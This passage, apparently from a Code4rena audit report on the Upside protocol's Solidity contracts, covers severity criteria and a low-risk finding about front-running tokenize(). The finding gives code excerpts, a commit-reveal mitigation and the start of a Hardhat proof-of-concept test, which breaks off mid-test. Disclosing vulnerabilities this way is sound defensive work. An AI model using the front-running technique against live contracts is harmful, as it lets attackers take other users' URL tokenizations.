href=\"https://github.com/code-423n4/2025-05-upside\"\u003eC4 Upside repository\u003c/a\u003e, and is composed of 2 smart contracts written in the Solidity programming language and includes 379 lines of Solidity code.\u003c/p\u003e\n\u003ch1 id=\"severity-criteria\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Criteria\u003c/h1\u003e\n\u003cp\u003eC4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.\u003c/p\u003e\n\u003cp\u003eHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMalicious Input Handling\u003c/li\u003e\n\u003cli\u003eEscalation of privileges\u003c/li\u003e\n\u003cli\u003eArithmetic\u003c/li\u003e\n\u003cli\u003eGas use\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on \u003ca href=\"https://code4rena.com\"\u003ethe C4 website\u003c/a\u003e, specifically our section on \u003ca href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\"\u003eSeverity Categorization\u003c/a\u003e.\u003c/p\u003e\n\u003ch1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"\u003e\u003ca href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eLow Risk and Non-Critical Issues\u003c/h1\u003e\n\u003cp\u003eFor this audit, 27 reports were submitted by wardens detailing low risk and non-critical issues. The \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-609\"\u003ereport highlighted below\u003c/a\u003e by \u003cstrong\u003eBrene\u003c/strong\u003e received the top score from the judge.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eThe following wardens also submitted reports: \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-238\"\u003e0xcb90f054\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-373\"\u003e0xhp9\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-117\"\u003e0xozovehe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-594\"\u003eAnyasaa\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-502\"\u003ebefree3x\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-680\"\u003ec0pp3rscr3w3r\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-420\"\u003eCasinoCompiler\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-226\"\u003edobrevaleri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-396\"\u003edystopia\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-251\"\u003eeLSeR17\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-115\"\u003efarismaulana\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-287\"\u003eharry\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-465\"\u003ehgrano\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-648\"\u003eJamil\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-171\"\u003eK42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-618\"\u003eMrPotatoMagic\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-243\"\u003epeppef\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-517\"\u003ePolarizedLight\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-434\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-423\"\u003eret2basic\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-436\"\u003eRoger\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-454\"\u003eSafetyBytes\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-547\"\u003esakibcy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-203\"\u003eSakursf\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-353\"\u003eTigerfrake\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-407\"\u003evaminator\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003ch2 id=\"01-front-running-attack-in-tokenize-function\" style=\"position:relative;\"\u003e\u003ca href=\"#01-front-running-attack-in-tokenize-function\" aria-label=\"01 front running attack in tokenize function permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[01] Front-running attack in tokenize function\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L113-L159\"\u003ehttps://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L113-L159\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description\" aria-label=\"finding description permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003etokenize()\u003c/code\u003e function in the \u003ccode\u003eUpsideProtocol\u003c/code\u003e contract allows users to tokenize the provided \u003ccode\u003eurl\u003c/code\u003e. A critical parameter governing this process is \u003ccode\u003etokenizeFeeEnabled\u003c/code\u003e, which determines whether users must pay a fee in order to call the function. When this flag is set to \u003ccode\u003efalse\u003c/code\u003e, users can freely call \u003ccode\u003etokenize()\u003c/code\u003e without paying any fee.\u003c/p\u003e\n\u003cp\u003eThis design introduces a significant front-running risk. Since the function can be called without restriction or cost when fees are disabled, malicious actors can monitor pending transactions in the mempool and submit the same \u003ccode\u003etokenize()\u003c/code\u003e call with a higher gas price to get their transaction mined first.\nOnce the second user successfully tokenizes the provided URL, the contract sets a mapping entry for that URL:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurlToMetaCoinMap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_url\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emetaCoinAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis causes \u003ccode\u003eurlToMetaCoinMap[_ur]\u003c/code\u003e to be non-zero. Therefore, when user1â€™s transaction is eventually mined, the following check fails:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurlToMetaCoinMap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_url\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eMetaCoinExists\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact\" style=\"position:relative;\"\u003e\u003ca href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eAttackers can steal high-value URLs (e.g., popular brand names).\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRequire users to first commit to a hash of the URL, and then reveal the full URL in a second transaction after a short delay. This prevents front-runners from knowing what is being tokenized in the first transaction.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn PoC.test.ts, make the following modification:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"2\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { HardhatEthersSigner } from \u0026quot;@nomicfoundation/hardhat-ethers/signers\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { ethers as hhethers } from \u0026quot;hardhat\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from \u0026quot;../types\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // Add this import\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   import { expect } from \u0026quot;chai\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eAdd the following test in the same file:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"3\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Should permit user2 to execute transactions ahead of user1\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurl1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;https://example1.com\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fee configuration\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeEnabled:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeStartingBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e9900\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 99%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,      \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 1%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayInterval:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e6\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 6 seconds\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeFinalBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,      \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 1%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDeployerBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 10%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeSellBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 1%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    };\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Set fee info\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Turn off auto-mining to simulate pending transactions in the mempool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enetwork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprovider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;evm_setAutomine\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// User1 submits a transaction with normal gas fees\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1Tx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan 